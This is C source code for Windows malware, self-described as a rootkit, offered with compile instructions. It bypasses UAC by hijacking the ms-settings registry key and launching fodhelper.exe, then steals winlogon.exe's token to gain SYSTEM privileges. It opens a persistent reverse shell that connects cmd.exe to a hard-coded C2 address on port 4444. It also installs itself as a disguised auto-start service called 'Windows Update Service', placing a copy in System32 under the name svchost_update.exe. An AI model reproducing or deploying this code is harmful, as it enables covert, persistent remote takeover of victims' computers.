/*
 * XvX Rootkit - Privilege Escalation
 * Copyright (c) 2026 - 28zaakypro@proton.me
 *
 * UAC bypass via fodhelper.exe and token stealing from winlogon.exe.
 * Establishes reverse TCP shell to C2 server with SYSTEM privileges.
 * 
 * Compile: gcc -o PrivEsc_C2.exe PrivEsc_C2.c -ladvapi32 -lshell32 -luser32 -lws2_32
 * 
 * From here : https://github.com/28Zaaky/Priv-Escalation-Exploit
 */

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>

#pragma comment(lib, "ws2_32.lib")

#define C2_HOST "192.168.1.147"
#define C2_PORT 4444

BOOL IsAdmin();
BOOL UACBypass();
BOOL EnablePrivileges();
DWORD FindWinlogonPID();
BOOL StealSystemToken();
BOOL CreateReverseShell(const char *host, int port);
BOOL CreatePersistentService();
BOOL InstallAsService();

BOOL IsAdmin()
{
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;

    if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
                                 DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup))
    {
        if (!CheckTokenMembership(NULL, adminGroup, &isAdmin))
        {
            isAdmin = FALSE;
        }
        FreeSid(adminGroup);
    }
    return isAdmin;
}

BOOL UACBypass()
{
    HKEY hKey = NULL;
    LONG result;

    const char *registryPath = "Software\\Classes\\ms-settings\\Shell\\Open\\command";
    const char *delegateExecute = "";

    char currentExe[MAX_PATH];
    if (GetModuleFileNameA(NULL, currentExe, MAX_PATH) == 0)
    {
        return FALSE;
    }

    char command[MAX_PATH + 50];
    snprintf(command, sizeof(command), "cmd /c start \"\" \"%s\" --admin", currentExe);

    result = RegCreateKeyExA(HKEY_CURRENT_USER, registryPath, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL);
    if (result != ERROR_SUCCESS)
    {
        return FALSE;
    }

    result = RegSetValueExA(hKey, "", 0, REG_SZ, (BYTE *)command, (DWORD)strlen(command) + 1);
    if (result != ERROR_SUCCESS)
    {
        RegCloseKey(hKey);
        return FALSE;
    }

    result = RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (BYTE *)delegateExecute, (DWORD)strlen(delegateExecute) + 1);
    if (result != ERROR_SUCCESS)
    {
        RegCloseKey(hKey);
        return FALSE;
    }

    RegCloseKey(hKey);

    SHELLEXECUTEINFOA sei = {sizeof(sei)};
    sei.lpFile = "C:\\Windows\\System32\\fodhelper.exe";
    sei.nShow = SW_HIDE;

    if (ShellExecuteExA(&sei))
    {
        Sleep(3000);
        RegDeleteKeyA(HKEY_CURRENT_USER, registryPath);
        return TRUE;
    }

    return FALSE;
}

BOOL EnablePrivileges()
{
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    char *privileges[] = {
        SE_DEBUG_NAME,
        SE_IMPERSONATE_NAME,
        SE_ASSIGNPRIMARYTOKEN_NAME,
        SE_INCREASE_QUOTA_NAME};

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
    {
        return FALSE;
    }

    for (int i = 0; i < sizeof(privileges) / sizeof(privileges[0]); i++)
    {
        if (LookupPrivilegeValue(NULL, privileges[i], &luid))
        {
            tp.PrivilegeCount = 1;
            tp.Privileges[0].Luid = luid;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

            AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
        }
    }

    CloseHandle(hToken);
    return TRUE;
}

DWORD FindWinlogonPID()
{
    const char *targetProcName = "winlogon.exe";
    DWORD processID = 0;

    HANDLE processSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (processSnapshot == INVALID_HANDLE_VALUE)
    {
        return 0;
    }

    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(processSnapshot, &processEntry))
    {
        CloseHandle(processSnapshot);
        return 0;
    }

    do
    {
        if (strcmp(targetProcName, processEntry.szExeFile) == 0)
        {
            processID = processEntry.th32ProcessID;
            break;
        }
    } while (Process32Next(processSnapshot, &processEntry));

    CloseHandle(processSnapshot);

    return processID;
}

BOOL CreateReverseShell(const char *host, int port)
{
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;
    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi = {0};

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        return FALSE;
    }

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET)
    {
        WSACleanup();
        return FALSE;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr(host);

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR)
    {
        closesocket(sock);
        WSACleanup();
        return FALSE;
    }

    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = (HANDLE)sock;
    si.hStdOutput = (HANDLE)sock;
    si.hStdError = (HANDLE)sock;

    char cmdPath[MAX_PATH];
    GetSystemDirectoryA(cmdPath, MAX_PATH);
    // Use safe string concatenation
    if (strlen(cmdPath) + strlen("\\cmd.exe") < MAX_PATH) {
        strcat_s(cmdPath, MAX_PATH, "\\cmd.exe");
    } else {
        strcpy_s(cmdPath, MAX_PATH, "C:\\Windows\\System32\\cmd.exe");
    }

    if (!CreateProcessA(cmdPath, NULL, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
    {
        closesocket(sock);
        WSACleanup();
        return FALSE;
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    // Keep connection open
    Sleep(INFINITE);

    closesocket(sock);
    WSACleanup();

    return TRUE;
}

BOOL StealSystemToken()
{
    DWORD pid = FindWinlogonPID();
    if (pid == 0)
    {
        return FALSE;
    }

    if (!EnablePrivileges())
    {
        return FALSE;
    }

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProcess)
    {
        return FALSE;
    }

    HANDLE hToken, hDupToken;
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY, &hToken))
    {
        CloseHandle(hProcess);
        return FALSE;
    }

    SECURITY_IMPERSONATION_LEVEL seImpersonateLevel = SecurityImpersonation;
    TOKEN_TYPE tokenType = TokenPrimary;

    if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, seImpersonateLevel, tokenType, &hDupToken))
    {
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return FALSE;
    }

    // Create reverse shell with SYSTEM token
    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi = {0};

    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    char currentExe[MAX_PATH];
    GetModuleFileNameA(NULL, currentExe, MAX_PATH);

    char commandLine[MAX_PATH + 50];
    snprintf(commandLine, sizeof(commandLine), "\"%s\" --system-shell", currentExe);

    if (!CreateProcessAsUserA(hDupToken, NULL, commandLine, NULL, NULL, FALSE,
                              CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
    {
        CloseHandle(hToken);
        CloseHandle(hDupToken);
        CloseHandle(hProcess);
        return FALSE;
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hToken);
    CloseHandle(hDupToken);
    CloseHandle(hProcess);

    return TRUE;
}

BOOL InstallAsService()
{
    SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCM)
    {
        return FALSE;
    }

    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);

    char servicePath[MAX_PATH];
    GetSystemDirectoryA(servicePath, MAX_PATH);
    
    if (strlen(servicePath) + strlen("\\svchost_update.exe") < MAX_PATH) {
        strcat_s(servicePath, MAX_PATH, "\\svchost_update.exe");
    }

    CopyFileA(exePath, servicePath, FALSE);
    
    char serviceCmd[MAX_PATH + 50];
    snprintf(serviceCmd, sizeof(serviceCmd), "\"%s\" --system-shell", servicePath);

    SC_HANDLE hService = CreateServiceA(
        hSCM,
        "WindowsUpdateService",
        "Windows Update Service",
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,
        SERVICE_ERROR_NORMAL,
        serviceCmd,
        NULL, NULL, NULL, NULL, NULL);

    if (!hService)
    {
        CloseServiceHandle(hSCM);
        return FALSE;
    }

    StartServiceA(hService, 0, NULL);

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);

    return TRUE;
}

BOOL CreatePersistentService()
{
    // Check if already running as service
    SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
    if (hSCM)
    {
        SC_HANDLE hService = OpenServiceA(hSCM, "WindowsUpdateService", SERVICE_QUERY_STATUS);
        if (hService)
        {
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCM);
            return TRUE;
        }
        CloseServiceHandle(hSCM);
    }
    
    return InstallAsService();
}

int main(int argc, char *argv[])
{
    // SYSTEM reverse shell mode
    if (argc > 1 && strcmp(argv[1], "--system-shell") == 0)
    {
        while (TRUE)
        {
            if (!CreateReverseShell(C2_HOST, C2_PORT))
            {
                Sleep(30000);
            }
        }
        return 0;
    }

    // Admin mode (after UAC bypass)
    if (argc > 1 && strcmp(argv[1], "--admin") == 0)
    {
        if (IsAdmin())
        {
            if (CreatePersistentService())
            {
                return 0;
            }
            else
            {
                StealSystemToken();
            }
        }
        return 0;
    }

    if (IsAdmin())
    {
        if (CreatePersistentService())
        {
            return 0;
        }
        else
        {
            StealSystemToken();
        }
    }
    else
    {
        UACBypass();
    }

    return 0;
}
